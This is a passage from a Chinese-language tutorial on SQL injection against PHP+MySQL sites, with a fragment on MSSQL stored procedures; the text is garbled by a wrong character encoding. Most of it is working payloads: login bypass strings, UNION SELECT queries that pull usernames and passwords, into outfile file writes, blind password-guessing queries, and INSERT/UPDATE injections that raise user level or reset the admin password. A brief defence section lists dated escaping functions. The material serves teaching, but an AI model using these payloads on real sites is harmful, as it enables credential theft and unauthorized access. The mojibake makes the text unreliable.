/>è¿”å›çš„ä¿¡æ¯æœ‰ä¸¤ä¸ªå­—æ®µsubdirectoryã€depthã€‚Subdirectoryå­—æ®µæ˜¯å­—ç¬¦å‹ï¼Œdepthå­—æ®µæ˜¯æ•´å½¢å­—æ®µã€‚&nbsp;<br />create table dirs(paths varchar(100), id int)&nbsp;<br />å»ºè¡¨ï¼Œè¿™é‡Œå»ºçš„è¡¨æ˜¯å’Œä¸Šé¢xp_blank&gt;_dirtreeç›¸å…³è¿ï¼Œå­—æ®µç›¸ç­‰ã€ç±»å‹ç›¸åŒã€‚&nbsp;<br />insert dirs exec master.dbo.xp_blank&gt;_dirtree c:\&nbsp;<br />åªè¦æˆ‘ä»¬å»ºè¡¨ä¸å­˜å‚¨è¿›ç¨‹è¿”å›çš„å­—æ®µç›¸å®šä¹‰ç›¸ç­‰å°±èƒ½å¤Ÿæ‰§è¡Œï¼è¾¾åˆ°å†™è¡¨çš„æ•ˆæœ,ä¸€æ­¥æ­¥è¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ï¼<br /><span style="color:#c0c0c0;">æ–‡ç« å‡ºå¤„ï¼šhttp://www.diybl.com/course/7_databases/sql/msshl/2007616/59684_2.html</span></p><p><span style="color:#c0c0c0;"></span>&nbsp;********************************************************************************</p><div style="color:rgb(69,69,69);"><p>===MYSQLåŸºç¡€éƒ¨åˆ†===<br />æœ¬è¡¨æŸ¥è¯¢ï¼š<br /><a href="http://127.0.0.1/injection/user.php?username=angel%27" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/user.php?username=angel'</span></a>&nbsp;and LENGTH(password)='6<br /><a href="http://127.0.0.1/injection/user.php?username=angel%27" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/user.php?username=angel'</span></a>&nbsp;and LEFT(password,1)='m</p><p></p><p>Unionè”åˆè¯­å¥ï¼š<br /><a href="http://127.0.0.1/injection/show.php?id=1%27" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/show.php?id=1'</span></a>&nbsp;union select 1,username,password from user/*<br /><a href="http://127.0.0.1/injection/show.php?id=%27" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/show.php?id='</span></a>&nbsp;union select 1,username,password from user/*</p><p>å¯¼å‡ºæ–‡ä»¶ï¼š<br /><a href="http://127.0.0.1/injection/user.php?username=angel%27" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/user.php?username=angel'</span></a>&nbsp;into outfile 'c:/file.txt<br /><a href="http://127.0.0.1/injection/user.php?username=%27" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/user.php?username='</span></a>&nbsp;or 1=1 into outfile 'c:/file.txt<br /><a href="http://127.0.0.1/injection/show.php?id=%27" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/show.php?id='</span></a>&nbsp;union select 1,username,password from user into outfile 'c:/user.txt</p><p>INSERTè¯­å¥ï¼š<br />INSERT INTO `user` (userid, username, password, homepage, userlevel) VALUES ('', '$username', '$password', '$homepage', '1');<br />æ„é€ homepageå€¼ä¸ºï¼š<a href="http://blog.csdn.net/" rel="nofollow"><span style="color:#70593f;">http://4ngel.net'</span></a>, '3â€™)#<br />SQLè¯­å¥å˜ä¸ºï¼šINSERT INTO `user` (userid, username, password, homepage, userlevel) VALUES ('', 'angel', 'mypass', 'http://4ngel.net', '3â€™)#', '1');</p><p>UPDATEè¯­å¥ï¼šæˆ‘å–œæ¬¢è¿™æ ·ä¸ªä¸œè¥¿<br />å…ˆç†è§£è¿™å¥SQL<br />UPDATE user SET password='MD5($password)', homepage='$homepage' WHERE id='$id'<br />å¦‚æœæ­¤SQLè¢«ä¿®æ”¹æˆä»¥ä¸‹å½¢å¼ï¼Œå°±å®ç°äº†æ³¨å…¥<br />1ï¼šä¿®æ”¹homepageå€¼ä¸º<br /><a href="http://blog.csdn.net/" rel="nofollow"><span style="color:#70593f;">http://4ngel.net'</span></a>, userlevel='3<br />ä¹‹åSQLè¯­å¥å˜ä¸º<br />UPDATE user SET password='mypass', homepage='http://4ngel.net', userlevel='3' WHERE id='$id'<br />userlevelä¸ºç”¨æˆ·çº§åˆ«<br />2:ä¿®æ”¹passwordå€¼ä¸º<br />mypass)' WHERE username='admin'#<br />ä¹‹åSQLè¯­å¥å˜ä¸º<br />UPDATE user SET password='MD5(mypass)' WHERE username='admin'#)', homepage='$homepage' WHERE id='$id'<br />3ï¼šä¿®æ”¹idå€¼ä¸º<br />' OR username='admin'<br />ä¹‹åSQLè¯­å¥å˜ä¸º<br />UPDATE user SET password='MD5($password)', homepage='$homepage' WHERE id='' OR username='admin'</p><p>===é«˜çº§éƒ¨åˆ†===<br />å¸¸ç”¨çš„MySQLå†…ç½®å‡½æ•°<br />DATABASE()<br />USER()<br />SYSTEM_USER()<br />SESSION_USER()<br />CURRENT_USER()<br />database()<br />version()<br />SUBSTRING()<br />MID()<br />char()<br />load_file()<br />â€¦â€¦<br />å‡½æ•°åº”ç”¨<br />UPDATE article SET title=DATABASE() WHERE id=1<br /><a href="http://127.0.0.1/injection/show.php?id=-1" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/show.php?id=-1</span></a>&nbsp;union select 1,database(),version()<br />SELECT * FROM user WHERE username=char(97,110,103,101,108)<br /># char(97,110,103,101,108) ç›¸å½“äºangelï¼Œåè¿›åˆ¶<br /><a href="http://127.0.0.1/injection/user.php?userid=1" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/user.php?userid=1</span></a>&nbsp;and password=char(109,121,112,97,115,115)http://127.0.0.1/injection/user.php?userid=1 and LEFT(password,1)&gt;char(100)<br /><a href="http://127.0.0.1/injection/user.php?userid=1" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/user.php?userid=1</span></a>&nbsp;and ord(mid(password,3,1))&gt;111</p><p>ç¡®å®šæ•°æ®ç»“æ„çš„å­—æ®µä¸ªæ•°åŠç±»å‹<br /><a href="http://127.0.0.1/injection/show.php?id=-1" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/show.php?id=-1</span></a>&nbsp;union select 1,1,1<br /><a href="http://127.0.0.1/injection/show.php?id=-1" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/show.php?id=-1</span></a>&nbsp;union select char(97),char(97),char(97)</p><p>çŒœæ•°æ®è¡¨å<br /><a href="http://127.0.0.1/injection/show.php?id=-1" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/show.php?id=-1</span></a>&nbsp;union select 1,1,1 from members</p><p>è·¨è¡¨æŸ¥è¯¢å¾—åˆ°ç”¨æˆ·åå’Œå¯†ç <br /><a href="http://127.0.0.1/ymdown/show.php?id=10000" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/ymdown/show.php?id=10000</span></a>&nbsp;union select 1,username,1,password,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1</p><p>å…¶ä»–<br />#éªŒè¯ç¬¬ä¸€ä½å¯†ç <br /><a href="http://127.0.0.1/ymdown/show.php?id=10" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/ymdown/show.php?id=10</span></a>&nbsp;union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and ord(mid(password,1,1))=49</p><p>===æ³¨å…¥é˜²èŒƒ===<br />æœåŠ¡å™¨æ–¹é¢<br />magic_quotes_gpcè®¾ç½®ä¸ºOn<br />display_errorsè®¾ç½®ä¸ºOff<br />ç¼–ç æ–¹é¢<br />$keywords = addslashes($keywords);<br />$keywords = str_replace("_","\_",$keywords);<br />$keywords = str_replace("%","\%",$keywords);<br />æ•°å€¼ç±»å‹<br />ä½¿ç”¨intval()æŠ“æ¢<br />å­—ç¬¦ä¸²ç±»å‹<br />SQLè¯­å¥å‚æ•°ä¸­è¦æ·»åŠ å•å¼•å·<br />ä¸‹é¢ä»£ç ï¼Œç”¨äºé˜²æ²»æ³¨å…¥<br />if (get_magic_quotes_gpc()) {<br />//....<br />}else{<br />$str = mysql_real_escape_string($str);<br />$keywords = str_replace("_","\_",$keywords);<br />$keywords = str_replace("%","\%",$keywords);<br />}<br />æœ‰ç”¨çš„å‡½æ•°<br />stripslashes()<br />get_magic_quotes_gpc()<br />mysql_real_escape_string()<br />strip_tags()<br />array_map()<br />addslashes()<br />å‚è€ƒæ–‡ç« ï¼š<br /><a href="http://www.phpe.net/mysql_manual/06-4.html" rel="nofollow"><span style="color:#70593f;">http://www.phpe.net/mysql_manual/06-4.html</span></a>ï¼ˆMYSQLè¯­å¥å‚è€ƒï¼‰</p></div><p>&nbsp;</p><p>ä»¥ä¸‹å®ä¾‹ï¼Œä½œè€…angel</p><p><span style="font-weight:700;">php+Mysqlçš„æ³¨å…¥</span></p><p>ã€€ã€€å›½å†…èƒ½çœ‹åˆ°php+Mysqlæ³¨å…¥çš„æ–‡ç« å¯èƒ½æ¯”è¾ƒå°‘ï¼Œä½†æ˜¯å¦‚æœå…³æ³¨å„ç§WEBç¨‹åºçš„æ¼æ´ï¼Œå°±å¯ä»¥å‘ç°ï¼Œå…¶å®è¿™äº›æ¼æ´çš„æ–‡ç« å…¶å®å°±æ˜¯ä¸€ä¸ªä¾‹å­ã€‚ä¸è¿‡ç”±äºå›½å†…ç ”ç©¶PHPçš„äººæ¯”ç ”ç©¶ASPçš„äººå®åœ¨å°‘å¤ªå¤šï¼Œæ‰€ä»¥ï¼Œå¯èƒ½æ²¡æœ‰æ³¨æ„ï¼Œå†µä¸”PHPçš„å®‰å…¨æ€§æ¯”ASPé«˜å¾ˆå¤šï¼Œå¯¼è‡´å¾ˆå¤šäººä¸æƒ³è·¨è¶Šè¿™ä¸ªé—¨æ§›ã€‚<br />ã€€ã€€å°½ç®¡å¦‚æ­¤ï¼Œåœ¨PHPç«™ç‚¹æ—¥ç›Šå¢å¤šçš„ä»Šå¤©ï¼ŒSQLæ³¨å…¥ä»æ˜¯æœ€æœ‰æ•ˆæœ€éº»çƒ¦çš„ä¸€ç§æ”»å‡»æ–¹å¼ï¼Œæœ‰æ•ˆæ˜¯å› ä¸ºè‡³å°‘70% ä»¥ä¸Šçš„ç«™ç‚¹å­˜åœ¨SQL Injectionæ¼æ´ï¼ŒåŒ…æ‹¬å›½å†…å¤§éƒ¨åˆ†å®‰å…¨ç«™ç‚¹ï¼Œéº»çƒ¦æ˜¯å› ä¸ºMYSQL4ä»¥ä¸‹çš„ç‰ˆæœ¬æ˜¯ä¸æ”¯æŒå­è¯­å¥çš„ï¼Œè€Œä¸”å½“php.inié‡Œçš„ magic_quotes_gpc ä¸ºOn æ—¶ã€‚æäº¤çš„å˜é‡ä¸­æ‰€æœ‰çš„ ' (å•å¼•å·), " (åŒå¼•å·), \ (åæ–œçº¿) and ç©ºå­—ç¬¦ä¼šè‡ªåŠ¨è½¬ä¸ºå«æœ‰åæ–œçº¿çš„è½¬ä¹‰å­—ç¬¦ã€‚ç»™æ³¨å…¥å¸¦æ¥ä¸å°‘çš„é˜»ç¢ã€‚<br />ã€€ã€€æ—©æœŸçš„æ—¶å€™ï¼Œæ ¹æ®ç¨‹åºçš„ä»£ç ï¼Œè¦æ„é€ å‡ºæ²¡æœ‰å¼•å·çš„è¯­å¥å½¢æˆæœ‰æ•ˆçš„æ”»å‡»ï¼Œè¿˜çœŸçš„æœ‰ç‚¹å›°éš¾ï¼Œå¥½åœ¨ç°åœ¨çš„æŠ€æœ¯å·²ç»æ„é€ å‡ºä¸å¸¦å¼•å·çš„è¯­å¥åº”ç”¨åœ¨æŸäº›åœºåˆã€‚åªè¦æœ‰ç»éªŒï¼Œå…¶å®æ„é€ æœ‰æ•ˆçš„è¯­å¥ä¸€ç‚¹ä¹Ÿä¸éš¾ï¼Œç”šè‡³æˆåŠŸç‡ä¹Ÿå¾ˆé«˜ï¼Œä½†å…·ä½“æƒ…å†µå…·ä½“åˆ†æã€‚é¦–å…ˆè¦èµ°å‡ºä¸€ä¸ªè¯¯åŒºã€‚</p><p><em>æ³¨ï¼šåœ¨æ²¡æœ‰å…·ä½“è¯´æ˜çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å‡è®¾magic_quotes_gpcå‡ä¸ºoffã€‚</em></p><p><span style="font-weight:700;">php+Mysqlæ³¨å…¥çš„è¯¯åŒº</span></p><p>ã€€ã€€å¾ˆå¤šäººè®¤ä¸ºåœ¨PHP+MYSQLä¸‹æ³¨å…¥ä¸€å®šè¦ç”¨åˆ°å•å¼•å·ï¼Œæˆ–è€…æ˜¯æ²¡æœ‰åŠæ³•åƒMSSQLé‚£æ ·å¯ä»¥ä½¿ç”¨â€œdeclare @a sysname select @a=&lt;command&gt; exec master.dbo.xp_cmdshell @aâ€è¿™ç±»çš„å‘½ä»¤æ¥æ¶ˆé™¤å¼•å·ï¼Œå…¶å®è¿™ä¸ªæ˜¯å¤§å®¶å¯¹æ³¨å…¥çš„ä¸€ç§è¯¯è§£æˆ–è¿™è¯´æ˜¯å¯¹æ³¨å…¥è®¤è¯†ä¸Šçš„ä¸€ç§è¯¯åŒºã€‚<br />ã€€ã€€ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºä¸ç®¡åœ¨ä»€ä¹ˆè¯­è¨€é‡Œï¼Œåœ¨å¼•å·ï¼ˆåŒ…æ‹¬å•åŒï¼‰é‡Œï¼Œæ‰€æœ‰å­—ç¬¦ä¸²å‡æ˜¯å¸¸é‡ï¼Œå³ä½¿æ˜¯dirè¿™æ ·çš„å‘½ä»¤ï¼Œä¹Ÿç´§ç´§æ˜¯å­—ç¬¦ä¸²è€Œå·²ï¼Œå¹¶ä¸èƒ½å½“åšå‘½ä»¤æ‰§è¡Œï¼Œé™¤éæ˜¯è¿™æ ·å†™çš„ä»£ç ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><span style="color:#0000ff;">$command = "dir c:\";<br />system($command);</span></td></tr></tbody></table></div><p>ã€€ã€€å¦åˆ™ä»…ä»…åªæ˜¯å­—ç¬¦ä¸²ï¼Œå½“ç„¶ï¼Œæˆ‘ä»¬æ‰€è¯´çš„å‘½ä»¤ä¸å•æŒ‡ç³»ç»Ÿå‘½ä»¤ï¼Œæˆ‘ä»¬è¿™é‡Œè¯´çš„æ˜¯SQLè¯­å¥ï¼Œè¦è®©æˆ‘ä»¬æ„é€ çš„SQLè¯­å¥æ­£å¸¸æ‰§è¡Œï¼Œå°±ä¸èƒ½è®©æˆ‘ä»¬çš„è¯­å¥å˜æˆå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆä»€ä¹ˆæƒ…å†µä¸‹ä¼šç”¨å•å¼•å·ï¼Ÿä»€ä¹ˆæ—¶å€™ä¸ç”¨å‘¢ï¼Ÿçœ‹çœ‹ä¸‹é¢ä¸¤å¥SQLè¯­å¥ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><span style="color:#0000ff;">â‘ SELECT * FROM article WHERE articleid='$id'<br />â‘¡SELECT * FROM article WHERE articleid=$id</span></td></tr></tbody></table></div><p>ã€€ã€€ä¸¤ç§å†™æ³•åœ¨å„ç§ç¨‹åºä¸­éƒ½å¾ˆæ™®éï¼Œä½†å®‰å…¨æ€§æ˜¯ä¸åŒçš„ï¼Œç¬¬ä¸€å¥ç”±äºæŠŠå˜é‡$idæ”¾åœ¨ä¸€å¯¹å•å¼•å·ä¸­ï¼Œè¿™æ ·ä½¿å¾—æˆ‘ä»¬æ‰€æäº¤çš„å˜é‡éƒ½å˜æˆäº†å­—ç¬¦ä¸²ï¼Œå³ä½¿åŒ…å«äº†æ­£ç¡®çš„SQLè¯­å¥ï¼Œä¹Ÿä¸ä¼šæ­£å¸¸æ‰§è¡Œï¼Œè€Œç¬¬äºŒå¥ä¸åŒï¼Œç”±äºæ²¡æœ‰æŠŠå˜é‡æ”¾è¿›å•å¼•å·ä¸­ï¼Œé‚£æˆ‘ä»¬æ‰€æäº¤çš„ä¸€åˆ‡ï¼Œåªè¦åŒ…å«ç©ºæ ¼ï¼Œé‚£ç©ºæ ¼åçš„å˜é‡éƒ½ä¼šä½œä¸ºSQLè¯­å¥æ‰§è¡Œï¼Œæˆ‘ä»¬é’ˆå¯¹ä¸¤ä¸ªå¥å­åˆ†åˆ«æäº¤ä¸¤ä¸ªæˆåŠŸæ³¨å…¥çš„ç•¸å½¢è¯­å¥ï¼Œæ¥çœ‹çœ‹ä¸åŒä¹‹å¤„ã€‚</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">â‘  æŒ‡å®šå˜é‡$idä¸ºï¼š<br />1' and 1=2 union select * from user where userid=1/*<br />æ­¤æ—¶æ•´ä¸ªSQLè¯­å¥å˜ä¸ºï¼š<br />SELECT * FROM article WHERE articleid='1' and 1=2 union select * from user where userid=1/*'</span></p><p><span style="color:#0000ff;">â‘¡æŒ‡å®šå˜é‡$idä¸ºï¼š<br />1 and 1=2 union select * from user where userid=1<br />æ­¤æ—¶æ•´ä¸ªSQLè¯­å¥å˜ä¸ºï¼š<br />SELECT * FROM article WHERE articleid=1 and 1=2 union select * from user where userid=1</span></p></td></tr></tbody></table></div><p>ã€€ã€€çœ‹å‡ºæ¥äº†å—ï¼Ÿç”±äºç¬¬ä¸€å¥æœ‰å•å¼•å·ï¼Œæˆ‘ä»¬å¿…é¡»å…ˆé—­åˆå‰é¢çš„å•å¼•å·ï¼Œè¿™æ ·æ‰èƒ½ä½¿åé¢çš„è¯­å¥ä½œä¸ºSQLæ‰§è¡Œï¼Œå¹¶è¦æ³¨é‡Šæ‰åé¢åŸSQLè¯­å¥ä¸­çš„åé¢çš„å•å¼•å·ï¼Œè¿™æ ·æ‰å¯ä»¥æˆåŠŸæ³¨å…¥ï¼Œå¦‚æœphp.iniä¸­magic_quotes_gpcè®¾ç½®ä¸ºonæˆ–è€…å˜é‡å‰ä½¿ç”¨äº†addslashes()å‡½æ•°ï¼Œæˆ‘ä»¬çš„æ”»å‡»å°±ä¼šåŒ–ä¸ºä¹Œæœ‰ï¼Œä½†ç¬¬äºŒå¥æ²¡æœ‰ç”¨å¼•å·åŒ…å«å˜é‡ï¼Œé‚£æˆ‘ä»¬ä¹Ÿä¸ç”¨è€ƒè™‘å»é—­åˆã€æ³¨é‡Šï¼Œç›´æ¥æäº¤å°±OKäº†ã€‚<br />ã€€ã€€å¤§å®¶çœ‹åˆ°ä¸€äº›æ–‡ç« ç»™å‡ºçš„è¯­å¥ä¸­æ²¡æœ‰åŒ…å«å•å¼•å·ä¾‹å¦‚pinkeyesçš„ã€Šphpæ³¨å…¥å®ä¾‹ã€‹ä¸­ç»™å‡ºçš„é‚£å¥SQLè¯­å¥ï¼Œæ˜¯æ²¡æœ‰åŒ…å«å¼•å·çš„ï¼Œå¤§å®¶ä¸è¦è®¤ä¸ºçœŸçš„å¯ä»¥ä¸ç”¨å¼•å·æ³¨å…¥ï¼Œä»”ç»†çœ‹çœ‹PHPBBçš„ä»£ç ï¼Œå°±å¯ä»¥å‘ç°ï¼Œé‚£ä¸ª$forum_idæ‰€åœ¨çš„SQLè¯­å¥æ˜¯è¿™æ ·å†™çš„ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">$sql = "SELECT *<br />FROM " . FORUMS_TABLE . "<br />WHERE forum_id = $forum_id";</span></p></td></tr></tbody></table></div><p>ã€€ã€€ç”±äºæ²¡æœ‰ç”¨å•å¼•å·åŒ…å«å˜é‡ï¼Œæ‰ç»™pinkeyesè¿™ä¸ªå®¶ä¼™æœ‰æœºå¯ä¹˜ï¼Œæ‰€ä»¥å¤§å®¶åœ¨å†™PHPç¨‹åºçš„æ—¶å€™ï¼Œè®°å¾—ç”¨å•å¼•å·æŠŠå˜é‡åŒ…å«èµ·æ¥ã€‚å½“ç„¶ï¼Œå¿…è¦çš„å®‰å…¨æªæ–½æ˜¯å¿…ä¸å¯å°‘çš„ã€‚</p><p><span style="font-weight:700;">ç®€å•çš„ä¾‹å­</span></p><p>ã€€ã€€å…ˆä¸¾ä¸€ä¸ªä¾‹å­æ¥ç»™å¤§å®¶äº†è§£ä¸€ä¸‹PHPä¸‹çš„æ³¨å…¥çš„ç‰¹æ®Šæ€§å’ŒåŸç†ã€‚å½“ç„¶ï¼Œè¿™ä¸ªä¾‹å­ä¹Ÿå¯ä»¥å‘Šè¯‰å¤§å®¶å¦‚ä½•å­¦ä¹ æ„é€ æœ‰æ•ˆçš„SQLè¯­å¥ã€‚<br />ã€€ã€€æˆ‘ä»¬æ‹¿ä¸€ä¸ªç”¨æˆ·éªŒè¯çš„ä¾‹å­ï¼Œé¦–å…ˆå»ºç«‹ä¸€ä¸ªæ•°æ®åº“å’Œä¸€ä¸ªæ•°æ®è¡¨å¹¶æ’å…¥ä¸€æ¡è®°å½•ï¼Œå¦‚ä¸‹ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">CREATE TABLE `user` (<br />`userid` int(11) NOT NULL auto_increment,<br />`username` varchar(20) NOT NULL default '',<br />`password` varchar(20) NOT NULL default '',<br />PRIMARY KEY (`userid`)<br />) TYPE=MyISAM AUTO_INCREMENT=3 ;</span></p><p><span style="color:#0000ff;">#<br /># å¯¼å‡ºè¡¨ä¸­çš„æ•°æ® `user`<br />#</span></p><p><span style="color:#0000ff;">INSERT INTO `user` VALUES (1, 'angel', 'mypass');</span></p></td></tr></tbody></table></div><p>ã€€ã€€éªŒè¯ç”¨æˆ·æ–‡ä»¶çš„ä»£ç å¦‚ä¸‹ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">&lt;?php<br />$servername = "localhost";<br />$dbusername = "root";<br />$dbpassword = "";<br />$dbname = "injection";</span></p><p><span style="color:#0000ff;">mysql_connect($servername,$dbusername,$dbpassword) or die ("æ•°æ®åº“è¿æ¥å¤±è´¥");</span></p><p><span style="color:#0000ff;">$sql = "SELECT * FROM user WHERE username='$username' AND password='$password'";</span></p><p><span style="color:#0000ff;">$result = mysql_db_query($dbname, $sql);<br />$userinfo = mysql_fetch_array($result);</span></p><p><span style="color:#0000ff;">if (empty($userinfo))<br />{<br />echo "ç™»é™†å¤±è´¥";<br />} else {<br />echo "ç™»é™†æˆåŠŸ";<br />}</span></p><p><span style="color:#0000ff;">echo "&lt;p&gt;SQL Query:$sql&lt;p&gt;";<br />?&gt;</span></p></td></tr></tbody></table></div><p>ã€€ã€€è¿™æ—¶æˆ‘ä»¬æäº¤ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?username=angel' or 1=1</span></p></td></tr></tbody></table></div><p>ã€€ã€€å°±ä¼šè¿”å›ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in F:\www\injection\user.php on line 13<br />ç™»é™†å¤±è´¥</span></p><p><span style="color:#0000ff;">SQL Query:SELECT * FROM user WHERE username='angel' or 1=1' AND password=''</span></p><p><span style="color:#0000ff;">PHP Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in F:\www\injection\user.php on line 13</span></p></td></tr></tbody></table></div><p>ã€€ã€€çœ‹åˆ°äº†å—ï¼Ÿå•å¼•å·é—­åˆåï¼Œå¹¶æ²¡æœ‰æ³¨é‡Šæ‰åé¢çš„å•å¼•å·ï¼Œå¯¼è‡´å•å¼•å·æ²¡æœ‰æ­£ç¡®é…å¯¹ï¼Œæ‰€ä»¥ç”±æ­¤å¯çŸ¥æˆ‘ä»¬æ„é€ çš„è¯­å¥ä¸èƒ½è®©Mysqlæ­£ç¡®æ‰§è¡Œï¼Œè¦é‡æ–°æ„é€ ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?username=angel' or '1=1</span></p></td></tr></tbody></table></div><p>ã€€ã€€è¿™æ—¶æ˜¾ç¤ºâ€œç™»é™†æˆåŠŸâ€ï¼Œè¯´æ˜æˆåŠŸäº†ã€‚æˆ–è€…æäº¤ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?username=angel'/*<br />http://127.0.0.1/injection/user.php?username=angel'%23</span></p></td></tr></tbody></table></div><p>ã€€ã€€è¿™æ ·å°±æŠŠåé¢çš„è¯­å¥ç»™æ³¨é‡Šæ‰äº†ï¼è¯´è¯´è¿™ä¸¤ç§æäº¤çš„ä¸åŒä¹‹å¤„ï¼Œæˆ‘ä»¬æäº¤çš„ç¬¬ä¸€å¥æ˜¯åˆ©ç”¨é€»è¾‘è¿ç®—ï¼Œåœ¨ASPä¸­è¿ç”¨å¯ä»¥è¯´æ˜¯éå¸¸å¹¿æ³›çš„ï¼Œè¿™ä¸ªä¸ç”¨è¯´äº†å§ï¼Ÿç¬¬äºŒã€ä¸‰å¥æ˜¯æ ¹æ®mysqlçš„ç‰¹æ€§ï¼Œmysqlæ”¯æŒ/*å’Œ#ä¸¤ç§æ³¨é‡Šæ ¼å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬æäº¤çš„æ—¶å€™æ˜¯æŠŠåé¢çš„ä»£ç æ³¨é‡Šæ‰ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ç”±äºç¼–ç é—®é¢˜ï¼Œåœ¨IEåœ°å€æ é‡Œæäº¤#ä¼šå˜æˆç©ºçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨åœ°å€æ æäº¤çš„æ—¶å€™ï¼Œåº”è¯¥æäº¤%23ï¼Œæ‰ä¼šå˜æˆ#ï¼Œå°±æˆåŠŸæ³¨é‡Šäº†ï¼Œè¿™ä¸ªæ¯”é€»è¾‘è¿ç®—ç®€å•å¾—å¤šäº†ï¼Œç”±æ­¤å¯ä»¥çœ‹å‡ºPHPæ¯”ASPå¼ºå¤§çµæ´»å¤šäº†ã€‚<br />ã€€ã€€é€šè¿‡ä¸Šé¢çš„ä¾‹å­å¤§å®¶åº”è¯¥å¯¹PHP+MYSQLçš„æ³¨å…¥æœ‰ä¸ªæ„Ÿæ€§çš„è®¤è¯†äº†å§ï¼Ÿ</p><p><span style="font-weight:700;">è¯­å¥æ„é€ </span></p><p>ã€€ã€€PHP+MYSQLæ³¨å…¥çš„åšå¤§ç²¾æ·±ä¸ä»…ä»…ä½“ç°åœ¨è®¤è¯ä½“ç³»çš„é¥¶è¿‡ï¼Œè¯­å¥çš„æ„é€ æ‰æ˜¯æœ€æœ‰è¶£å‘³çš„åœ°æ–¹ï¼Œä½†æ„é€ è¯­å¥å’ŒACCESSã€MSSQLéƒ½æœ‰å°‘è®¸ä¸åŒï¼Œä½†åŒæ ·å¯ä»¥å‘æŒ¥å¾—æ·‹æ¼“å°½è‡´ã€‚çœ‹ä¸‹é¢çš„ä¾‹å­ã€‚</p><p><span style="font-weight:700;">ä¸€ã€æœç´¢å¼•æ“</span></p><p>ã€€ã€€ç½‘ä¸Šæœ‰ä¸€å¤§å †çš„PHPç¨‹åºæœç´¢å¼•æ“æ˜¯æœ‰é—®é¢˜çš„ï¼Œä¹Ÿå°±æ˜¯æäº¤ç‰¹æ®Šå­—ç¬¦å¯ä»¥æ˜¾ç¤ºæ‰€æœ‰è®°å½•ï¼ŒåŒ…æ‹¬ä¸ç¬¦åˆæ¡ä»¶çš„ï¼Œå…¶å®è¿™ä¸ªå±å®³ä¹Ÿä¸ç®—å¤§ï¼Œå› ä¸ºå…è®¸ç”¨æˆ·è¾“å…¥å…³é”®å­—è¿›è¡Œæ¨¡ç³ŠæŸ¥è¯¢çš„åœ°æ–¹å¤§å¤šæ•°éƒ½å…è®¸æ£€ç´¢æ‰€æœ‰çš„è®°å½•ã€‚å¾ˆå¤šæŸ¥è¯¢çš„è®¾è®¡å°±æ˜¯è¿™æ ·çš„ã€‚<br />ã€€ã€€æŸ¥è¯¢æ˜¯åªè¯»çš„æ“ä½œåº”è¯¥ä¸ä¼šå¯¹æ•°æ®äº§ç”Ÿç 